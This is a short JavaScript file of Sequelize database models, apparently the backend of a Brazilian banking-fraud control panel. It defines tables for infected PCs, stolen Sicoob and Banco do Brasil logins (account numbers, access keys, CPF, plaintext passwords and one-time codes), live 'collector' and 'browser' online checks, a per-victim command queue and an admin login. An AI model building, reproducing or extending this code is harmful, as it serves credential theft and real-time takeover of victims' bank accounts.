const { DataTypes } = require('sequelize');
const sequelize = require('../config/database');

const NFCT = sequelize.define('NFCT', {
  PC: { type: DataTypes.STRING },
  USER: { type: DataTypes.STRING },
  BANCO: { type: DataTypes.STRING },
  STATUSRESUMO: { type: DataTypes.STRING }
}, { timestamps: false, freezeTableName: true });

const B_SICOOB = sequelize.define('B_SICOOB', {
  FK_ID_NFCT: { type: DataTypes.INTEGER },
  COOPERATIVA: { type: DataTypes.STRING },
  CONTA: { type: DataTypes.STRING },
  CHAVEDEACESSO: { type: DataTypes.STRING },
  SENHA8: { type: DataTypes.STRING },
  SENHA6: { type: DataTypes.STRING },
  OTP: { type: DataTypes.STRING },
  TELA: { type: DataTypes.STRING },
  APELIDO: { type: DataTypes.STRING },
  DT_INCLUSAO: { type: DataTypes.DATE, defaultValue: DataTypes.NOW },
  SALDO: { type: DataTypes.DECIMAL(10, 2) },
  TOTAL: { type: DataTypes.DECIMAL(10, 2) }
}, { timestamps: false, freezeTableName: true });

const B_BB = sequelize.define('B_BB', {
  FK_ID_NFCT: { type: DataTypes.INTEGER },
  PERFIL: { type: DataTypes.STRING },
  TIPOACESSO: { type: DataTypes.STRING },
  CHAVEJ: { type: DataTypes.STRING },
  CPF: { type: DataTypes.STRING },
  SENHA: { type: DataTypes.STRING },
  DT_INCLUSAO: { type: DataTypes.DATE, defaultValue: DataTypes.NOW },
  SALDO: { type: DataTypes.DECIMAL(10, 2) },
  TOTAL: { type: DataTypes.DECIMAL(10, 2) },
  DT_COLLECTOR: { type: DataTypes.DATE },
  DT_BROWSER: { type: DataTypes.DATE },
  IS_COLLECTOR_ONLINE: {
    type: DataTypes.VIRTUAL,
    get() {
      const dtCollector = this.getDataValue('DT_COLLECTOR');
      if (!dtCollector) return false;
      const now = new Date();
      const diff = (now - new Date(dtCollector)) / 1000;
      return diff < 4;
    }
  },
  IS_BROWSER_ONLINE: {
    type: DataTypes.VIRTUAL,
    get() {
      const dtBrowser = this.getDataValue('DT_BROWSER');
      if (!dtBrowser) return false;
      const now = new Date();
      const diff = (now - new Date(dtBrowser)) / 1000;
      return diff < 4;
    }
  }
}, { timestamps: false, freezeTableName: true });

const B_BB_COMANDO = sequelize.define('B_BB_COMANDO', {
  FK_ID_NFCT: { type: DataTypes.INTEGER },
  DT_INCLUSAO: { type: DataTypes.DATE, defaultValue: DataTypes.NOW },
  COMANDO: { type: DataTypes.STRING },
  PROCESSADO: { type: DataTypes.BOOLEAN, defaultValue: false }
}, { timestamps: false, freezeTableName: true });

const ADM = sequelize.define('ADM', {
  LOGIN: { type: DataTypes.STRING },
  SENHA: { type: DataTypes.STRING }
}, { timestamps: false, freezeTableName: true });

// Definir associações
NFCT.hasMany(B_BB, { foreignKey: 'FK_ID_NFCT' });
B_BB.belongsTo(NFCT, { foreignKey: 'FK_ID_NFCT' });

NFCT.hasMany(B_SICOOB, { foreignKey: 'FK_ID_NFCT' });
B_SICOOB.belongsTo(NFCT, { foreignKey: 'FK_ID_NFCT' });

NFCT.hasMany(B_BB_COMANDO, { foreignKey: 'FK_ID_NFCT' });
B_BB_COMANDO.belongsTo(NFCT, { foreignKey: 'FK_ID_NFCT' });

module.exports = { NFCT, B_BB, B_BB_COMANDO, ADM, sequelize };
